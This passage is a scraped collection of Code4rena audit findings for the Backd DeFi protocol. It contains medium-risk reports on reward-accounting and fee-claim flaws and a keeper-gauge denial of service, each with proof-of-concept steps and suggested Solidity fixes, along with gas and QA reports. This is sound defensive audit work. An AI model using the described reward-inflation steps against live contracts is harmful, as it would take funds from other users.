_poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  3. You need to add below code at L170 of transferFrom() function.  if(strategies[src] != strategies[dst]) {     if(strategies[src]) { // from strategy to non-strategy         _poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  "}, {"title": "Users can claim more fees than expected if governance migrates current rewardToken again by fault.", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/86", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L70-L75 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L302-L322   # Vulnerability details  ## Impact Users can claim more fees than expected if governance migrates current rewardToken again by fault.  ## Proof of Concept In the migrate() function, there is no requirement newRewardToken != rewardToken. If this function is called with the same \"rewardToken\" parameter, \"_replacedRewardTokens\" will contain the current \"rewardToken\" also. Then when the user claims fees, \"userShares\" will be added two times for the same token at L302-L305, L314-L317. It's because \"curRewardTokenData.userFeeIntegrals[user]\" is updated at L332 after the \"userShares\" calculation for past rewardTokens. So the user can get paid more fees than he should.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps You need to add this require() at L71.  require(newRewardToken != rewardToken, Error.SAME_AS_CURRENT);  "}, {"title": "Strategy in StakerVault.sol can steal more rewards even though it's designed strategies shouldn't get rewards.", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/85", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L95 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L52-L63   # Vulnerability details  ## Impact Strategy in StakerVault.sol can steal more rewards even though it's designed strategies shouldn't get rewards. Also there will be a problem with a rewarding system in LpGauge.sol so that some normal users wouldn't get rewards properly.   ## Proof of Concept 1. Strategy A staked amount x and x will be added to StakerVault.strategiesTotalStaked. contracts\\StakerVault.sol#L312 2. Strategy A transferred the amount x to non-strategy B and StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked won't be updated. contracts\\StakerVault.sol#L111 3. After some time for the larger LpGauge.poolStakedIntegral, B claims rewards using the LpGauge.claimRewards() function. contracts\\tokenomics\\LpGauge.sol#L52  Inside LpGauge.userCheckPoint(), it's designed not to calculate LpGauge.perUserShare for strategy, but it will pass this condition because B is not a strategy. contracts\\tokenomics\\LpGauge.sol#L90  Furthermore, when calculate rewards, LpGauge.poolStakedIntegral will be calculated larger than a normal user stakes same amount. It's because StakerVault._poolTotalStaked wasn't updated when A transfers x amount to B so LpGauge.poolTotalStaked is less than correct value. contracts\\tokenomics\\LpGauge.sol#L113-L117  Finally B can get more rewards than he should and the reward system will pay more rewards than it's designed.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think there will be two methods to fix. Method 1 is to forbid a transfer between strategy and non-strategy so that strategy can't move funds to non-strategy. Method 2 is to update StakerVault.strategiesTotalStaked and StakerVault._poolTotalStaked correctly so that strategy won't claim more rewards than he should even though he claims rewards using non-strategy.  Method 1. You need to modify two functions. StakerVault.transfer(), StakerVault.transferFrom().  1. You need to add this require() at L112 for transfer(). require(strategies[msg.sender] == strategies[account], Error.FAILED_TRANSFER);  2. You need to add this require() at L144 for transferFrom(). require(strategies[src] == strategies[dst], Error.FAILED_TRANSFER);  Method 2. I've explained about this method in my medium risk report \"StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked\" I will copy the same code for your convenience.  You need to modify 3 functions. StakerVault.addStrategy(), StakerVault.transfer(), StakerVault.transferFrom().  1. You need to move staked amount from StakerVault._poolTotalStaked to StakerVault.strategiesTotalStaked every time when StakerVault.inflationManager approves a new strategy. You can modify addStrategy() at L98-L102 like this.  function addStrategy(address strategy) external override returns (bool) { \u00a0 \u00a0 require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS); \u00a0 \u00a0 require(!strategies[strategy], Error.ADDRESS_ALREADY_SET);  \u00a0 \u00a0 strategies[strategy] = true; \u00a0 \u00a0 _poolTotalStaked -= balances[strategy]; \u00a0 \u00a0 strategiesTotalStaked += balances[strategy];  \u00a0 \u00a0 return true; }  2. You need to add below code at L126 of transfer() function.  if(strategies[msg.sender] != strategies[account]) { \u00a0 \u00a0 if(strategies[msg.sender]) { // from strategy to non-strategy \u00a0 \u00a0 \u00a0 \u00a0 _poolTotalStaked += amount; \u00a0 \u00a0 \u00a0 \u00a0 strategiesTotalStaked -= amount; \u00a0 \u00a0 } \u00a0 \u00a0 else { // from non-strategy to strategy \u00a0 \u00a0 \u00a0 \u00a0 _poolTotalStaked -= amount; \u00a0 \u00a0 \u00a0 \u00a0 strategiesTotalStaked += amount; \u00a0 \u00a0 } }  3. You need to add below code at L170 of transferFrom() function.  if(strategies[src] != strategies[dst]) { \u00a0 \u00a0 if(strategies[src]) { // from strategy to non-strategy \u00a0 \u00a0 \u00a0 \u00a0 _poolTotalStaked += amount; \u00a0 \u00a0 \u00a0 \u00a0 strategiesTotalStaked -= amount; \u00a0 \u00a0 } \u00a0 \u00a0 else { // from non-strategy to strategy \u00a0 \u00a0 \u00a0 \u00a0 _poolTotalStaked -= amount; \u00a0 \u00a0 \u00a0 \u00a0 strategiesTotalStaked += amount; \u00a0 \u00a0 } }  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "  ## Using != 0 is cheaper than > 0 when used on a uint in a require() statement with the optimizer enabled  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L91-L92 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L137 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L84     ## Unnecessary variable definition in BkdLocker.sol, executeUnlocks() function  \"length\" is assigned to \"i\" and \"i\" is used for further operations, however \"length\" is never accessed again. Therefore, \"length\" can be directly used. Can be changed from this: ~~~         uint256 i = length;     //@audit gas no need to assign to i, directly use length         while (i > 0) {             i = i - 1;             if (stashedWithdraws[i].releaseTime <= block.timestamp) {                 totalAvailableToWithdraw += stashedWithdraws[i].amount;                  stashedWithdraws[i] = stashedWithdraws[stashedWithdraws.length - 1];                  stashedWithdraws.pop();             }         } ~~~ To this: ~~~         while (length > 0) {             length--;             if (stashedWithdraws[length].releaseTime <= block.timestamp) {                 totalAvailableToWithdraw += stashedWithdraws[length].amount;                  stashedWithdraws[length] = stashedWithdraws[stashedWithdraws.length - 1];                  stashedWithdraws.pop();             }         } ~~~     ## for index can be made unchecked  All the for indexes are made unchecked except this one.  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L22     ## Redundant initialisation to default value  keeperGaugeExists initialised with default value.   ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L412      ## Public state variables and immutables can be made private  Most of the public state variables, immutables and constants do not need to be public. Hence, they can be private to save gas.  ### Lines of code There are many instances, for example; https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L25-L53 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L25-L32     ## Execution of strict inequalities are cheaper than non-strict inequalities  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/CvxMintAmount.sol#L24 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L190     ## Prefix increment/decrements are cheaper than postfix  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L59 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L98   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/78", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": " ## Each event can have up to three indexed fields.  The address arguments of the below events can be made indexed.  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L29 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/interfaces/vendor/ICvxLocker.sol#L54 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L58 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L18     ## Use scientific notation (for example; 1E9) for large multiples of 10 to improve readability  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/CvxMintAmount.sol#L10-L12     ## Missing NatSpec comments  Many functions have no NatSpec comments at all. Even the functions which have NatSpec comments are missing @param, @return values.  ### Lines of code Just a few examples. Below functions have no NatSpec: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L110 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/CvxMintAmount.sol#L16 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L56 "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# gas opt `object`++ cost more then ++`object` . (same for --)  `object`+ 1 cost more then ++`object` .  caculate with unchecked cost less.   ## BkdLocker.sol  ``` line 140 - i = i - 1; ```  ``` fix - unchecked{ --i; } ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/75", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "1. Unused contracts and libraries are imported. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L4  Recommendation: Remove unused libraries.  2. Checkpoint executed twice when kill the gauge. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L427-L428  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L461-L462  `InflationManager` call `poolCheckPoint()`, then call `kill()` function, but inside of `kill()` function, `poolCheckPoint()` will be executed again.  Recommendation: Remove `poolCheckPoint()` call before kill.  3. Cache array length before loop to reduce gas cost Cache length of array and use it in the loop is a good solution to reduce gas. Other wise, it will always trying to load length from storage in every loop.  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L116  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L82   Recommendation Cache length of array and use it in loop.  4. Use `!=0` instead of `>0` for uint non zero check. In most of places, there is something like `a > 0` for non-zero check. For Uint variables, there is no negative value, so it\u2019s enough to change to `a != 0`.  Ex. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L140  Recommendation: Use non-equal operator instead of greater operator for non-zero check.  5. `lastEvent` in `Minter.sol` can be update multiple times. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L222  `_mint` function update `lastEvent` twice \u2013 first update in Line 222, and second update inside `executeInflationRateUpdate()`  Recommendation: Optimize code to avoid multiple updates.  6. Use interface contract for external calls. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L56  There is a `IBkdToken` interface, but now it is using `BkdToken` (implementation contract) for external calls. This increase contract size.  Recommendation: Use interface for external calls. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/74", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "1. Some functions have unused return value. Most of functions have `bool` return value to indicate success or failure. But the following functions return always true or revert transaction, so the return value is meaning less. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L57-L62  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L49-L54  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L72-L90   Recommendation: Return false for special conditions, or remove return value.  2. `reportFees()` function of `KeeperGauge.sol` needs to have zero amount check. There is no zero amount check in `reportFees()` function, thus `beneficiary`\u2019s `firstEpochSet` and `nextEpochToClaim` will be initialized, and this lead high gas cost in claim function.  Recommendation: Check zero amount to avoid updating data and wasting gas. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Low Risk Vulnerabilities ### 1. No function to remove gauge from whitelist If governance mistakenly whitelisted a faulty/malicious gauge, there is no way to remove it.  A malicious gauge could mint as much $BKD as it's currently available according to the inflation schedule, in detriment of other gauges' allocation.  #### Recommended Mitigation Steps Unless there's a reason not to, consider adding a function to remove gauge from whitelist in `InflationManager.sol`: ``` function blacklistGauge(address gauge)      external      override      onlyRoles(Roles.GOVERNANCE) {     gauges[gauge] = false; } ``` #### Related Links - https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L80-L82 - https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L181-L183 "}, {"title": "Potential DoS when removing keeper gauge", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/71", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L609-L618 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L82 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpActionFeeHandler.sol#L95-L98 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpAction.sol#L807 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpAction.sol#L653   # Vulnerability details  ## Impact When `_removeKeeperGauge` is called, there is no guarantee that the keeper gauge isn't currently in use by any `TopUpActionFeeHandler`. If it's still in use, any top up action executions will be disabled as reporting fees in `KeeperGauge.sol` will revert: ``` function reportFees(     address beneficiary,     uint256 amount,     address lpTokenAddress ) external override returns (bool) {     ...     require(!killed, Error.CONTRACT_PAUSED); // gauge is killed by InflationManager     ...     return true; } ``` If this happened during extreme market movements, some positions that require a top up will not be executed and be in risk of being liquidated.  ## Proof of Concept - Alice registers a top up action. - Governance calls `InflationManager.removeKeeperGauge`, replacing an old keeper gauge. However, governance forgot to call `TopUpActionFeeHandler.prepareKeeperGauge` so `TopUpActionFeeHandler.getKeeperGauge` still points to the killed gauge. - Market moved and Alice's position should now be executed by keepers, however any attempt to execute will revert:     ```     > Keeper calls TopUpAction.execute();     > _payFees();     > IActionFeeHandler(feeHandler).payFees();     > IKeeperGauge(keeperGauge).reportFees();     > reverts as gauge is already killed     ``` - Governance noticed and calls `prepareKeeperGauge`  with a 3 days delay. - Alice's position got liquidated before the change is executed.  ## Recommended Mitigation Steps Consider adding an on-chain check to ensure that the keeper gauge is not in use before removing them.   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "**Table of Contents:**  - [Cheap Contract Deployment Through Clones](#cheap-contract-deployment-through-clones) - [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof) - [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops) - [`++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)](#i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1) - [Increments can be unchecked in for-loops](#increments-can-be-unchecked-in-for-loops) - [No need to explicitly initialize variables with default values](#no-need-to-explicitly-initialize-variables-with-default-values) - [Reduce the size of error messages (Long revert Strings)](#reduce-the-size-of-error-messages-long-revert-strings) - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)  ## Cheap Contract Deployment Through Clones  See `@audit` tag:  ```solidity tokenomics/VestedEscrow.sol:99:                holdingAddress = address(new EscrowTokenHolder(address(rewardToken))); tokenomics/VestedEscrowRevocable.sol:44:        holdingContract[treasury_] = address(new EscrowTokenHolder(rewardToken_)); ```  There's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .  This is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:  - <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516> - <https://github.com/porter-finance/v1-core/pull/34>  I suggest applying a similar pattern.  ## `> 0` is less efficient than `!= 0` for unsigned integers (with proof)  `!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)  Proof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>  I suggest changing `> 0` with `!= 0` here:  ```solidity protocol/contracts/BkdLocker.sol:    91:         require(amount > 0, Error.INVALID_AMOUNT);    92:         require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);   137:         require(length > 0, \"No entries\");  protocol/contracts/tokenomics/AmmConvexGauge.sol:   158:         require(amount > 0, Error.INVALID_AMOUNT);   171:         require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/AmmGauge.sol:   104:         require(amount > 0, Error.INVALID_AMOUNT);   125:         require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/KeeperGauge.sol:   140:         require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED);  protocol/contracts/tokenomics/VestedEscrow.sol:   84:         require(unallocatedSupply > 0, \"No reward tokens in contract\"); ```  Also, please enable the Optimizer.  ## An array's length should be cached to save gas in for-loops  Reading array length at each iteration of the loop consumes more gas than necessary.    In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration. In the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.  Here, I suggest storing the array's length in a variable before the for-loop, and use this new variable instead:  ```solidity access/RoleManager.sol:82:        for (uint256 i; i < roles.length; i = i.uncheckedInc()) { tokenomics/FeeBurner.sol:56:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { tokenomics/InflationManager.sol:116:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { tokenomics/VestedEscrow.sol:94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { zaps/PoolMigrationZap.sol:22:        for (uint256 i; i < newPools_.length; ++i) { zaps/PoolMigrationZap.sol:39:        for (uint256 i; i < oldPoolAddresses_.length; ) { RewardHandler.sol:42:        for (uint256 i; i < pools.length; i = i.uncheckedInc()) { StakerVault.sol:259:        for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ```  ## `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)  Pre-increments and pre-decrements are cheaper.  For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:  **Increment:**  - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1` - `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)  **Decrement:**  - `i -= 1` is the most expensive form - `i--` costs 11 gas less than `i -= 1` - `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)  Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name *post-increment*:  ```solidity uint i = 1;   uint j = 2; require(j == i++, \"This will be false as i is incremented after the comparison\"); ```    However, pre-increments (or pre-decrements) return the new value:    ```solidity uint i = 1;   uint j = 2; require(j == ++i, \"This will be true as i is incremented before the comparison\"); ```    In the pre-increment case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`.      Affected code:    ```solidity tokenomics/KeeperGauge.sol:59:        epoch++; tokenomics/KeeperGauge.sol:98:        epoch++; ```  Consider using pre-increments and pre-decrements where they are relevant (meaning: not where post-increments/decrements logic are relevant).  ## Increments can be unchecked in for-loops  In Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.      [ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)  Affected code:    ```solidity zaps/PoolMigrationZap.sol:22:        for (uint256 i; i < newPools_.length; ++i) { ```  The change would be:      ```diff - for (uint256 i; i < numIterations; ++i) { + for (uint256 i; i < numIterations;) {  // ...   +   unchecked { ++i; } }   ```  The risk of overflow is non-existant for `uint256` here.  ## No need to explicitly initialize variables with default values  If a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`  Affected code:  ```solidity tokenomics/InflationManager.sol:412:        bool keeperGaugeExists = false; ```  I suggest removing explicit initializations for default values.  ## Reduce the size of error messages (Long revert Strings)  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  Revert strings > 32 bytes:  ```solidity tokenomics/Minter.sol:152:            \"Maximum non-inflation amount exceeded.\" //@audit size 38 ```  I suggest shortening the revert strings to fit in 32 bytes.  ## Use Custom Errors instead of Revert Strings to save Gas  Solidity 0.8.4 introduced custom errors. They are more gas efficient than revert strings, when it comes to deploy cost as well as runtime cost when the revert condition is met. Use custom errors instead of revert strings for gas savings.  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).  I suggest replacing all revert strings with custom errors in the solution.  ```solidity access/AuthorizationBase.sol:17:        require(_roleManager().hasRole(role, msg.sender), Error.UNAUTHORIZED_ACCESS); access/AuthorizationBase.sol:25:        require(_roleManager().hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS); access/AuthorizationBase.sol:33:        require(_roleManager().hasAnyRole(role1, role2, msg.sender), Error.UNAUTHORIZED_ACCESS); access/AuthorizationBase.sol:45:        require( access/RoleManager.sol:28:        require(hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS); access/RoleManager.sol:46:        require(getRoleMemberCount(Roles.GOVERNANCE) > 1, Error.CANNOT_REVOKE_ROLE); access/RoleManager.sol:112:        require(role != Roles.GOVERNANCE, Error.CANNOT_REVOKE_ROLE); access/RoleManager.sol:113:        require(hasRole(role, account), Error.INVALID_ARGUMENT); tokenomics/AmmConvexGauge.sol:65:        require( tokenomics/AmmConvexGauge.sol:87:        require(inflationRecipient == address(0), Error.ADDRESS_ALREADY_SET); tokenomics/AmmConvexGauge.sol:93:        require(inflationRecipient != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmConvexGauge.sol:172:        require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); tokenomics/AmmGauge.sol:50:        require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS); tokenomics/AmmGauge.sol:57:        require( tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmGauge.sol:126:        require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); tokenomics/BkdToken.sol:31:        require(msg.sender == minter, Error.UNAUTHORIZED_ACCESS); tokenomics/FeeBurner.sol:49:        require(tokens_.length != 0, \"No tokens to burn\"); tokenomics/FeeBurner.sol:75:        require(burningEth_ || msg.value == 0, Error.INVALID_VALUE); tokenomics/InflationManager.sol:48:        require(gauges[msg.sender], Error.UNAUTHORIZED_ACCESS); tokenomics/InflationManager.sol:59:        require(minter == address(0), Error.ADDRESS_ALREADY_SET); tokenomics/InflationManager.sol:60:        require(_minter != address(0), Error.INVALID_MINTER); tokenomics/InflationManager.sol:95:        require(!weightBasedKeeperDistributionDeactivated, \"Weight-based dist. deactivated.\"); tokenomics/InflationManager.sol:139:        require(_keeperGauges.contains(pool), Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:171:        require(length == weights.length, Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:174:            require(_keeperGauges.contains(pools[i]), Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:229:        require(gauges[IStakerVault(stakerVault).getLpGauge()], Error.GAUGE_DOES_NOT_EXIST); tokenomics/InflationManager.sol:244:        require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/InflationManager.sol:265:        require(length == weights.length, \"Invalid length of arguments\"); tokenomics/InflationManager.sol:270:            require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/InflationManager.sol:295:            require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/InflationManager.sol:315:        require(_ammGauges.contains(token), \"amm gauge not found\"); tokenomics/InflationManager.sol:365:        require(length == weights.length, \"Invalid length of arguments\"); tokenomics/InflationManager.sol:367:            require(_ammGauges.contains(tokens[i]), \"amm gauge not found\"); tokenomics/InflationManager.sol:424:        require(!exists || keeperGauge != _keeperGauge, Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:452:        require(IAmmGauge(_ammGauge).isAmmToken(token), Error.ADDRESS_NOT_WHITELISTED); tokenomics/InflationManager.sol:484:        require(addressProvider.isStakerVault(msg.sender, lpToken), Error.UNAUTHORIZED_ACCESS); tokenomics/InflationManager.sol:486:        require(lpGauge != address(0), Error.GAUGE_DOES_NOT_EXIST); tokenomics/InflationManager.sol:621:        require( tokenomics/KeeperGauge.sol:40:        require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS); tokenomics/KeeperGauge.sol:78:        require( tokenomics/KeeperGauge.sol:82:        require(!killed, Error.CONTRACT_PAUSED); tokenomics/KeeperGauge.sol:126:        require( tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); tokenomics/LpGauge.sol:31:        require(_stakerVault != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/LpGauge.sol:35:        require(address(_inflationManager) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/LpGauge.sol:53:        require( tokenomics/Minter.sol:72:        require(_annualInflationDecayLp < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); tokenomics/Minter.sol:73:        require(_annualInflationDecayKeeper < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); tokenomics/Minter.sol:74:        require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); tokenomics/Minter.sol:100:        require(address(token) == address(0), \"Token already set!\"); tokenomics/Minter.sol:105:        require(lastEvent == 0, \"Inflation has already started.\"); tokenomics/Minter.sol:132:        require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS); tokenomics/Minter.sol:150:        require( tokenomics/Minter.sol:220:        require(newTotalMintedToNow <= totalAvailableToNow, \"Mintable amount exceeded\"); tokenomics/VestedEscrow.sol:57:        require(starttime_ >= block.timestamp, \"start must be future\"); tokenomics/VestedEscrow.sol:58:        require(endtime_ > starttime_, \"end must be greater\"); tokenomics/VestedEscrow.sol:69:        require(_admin != address(0), 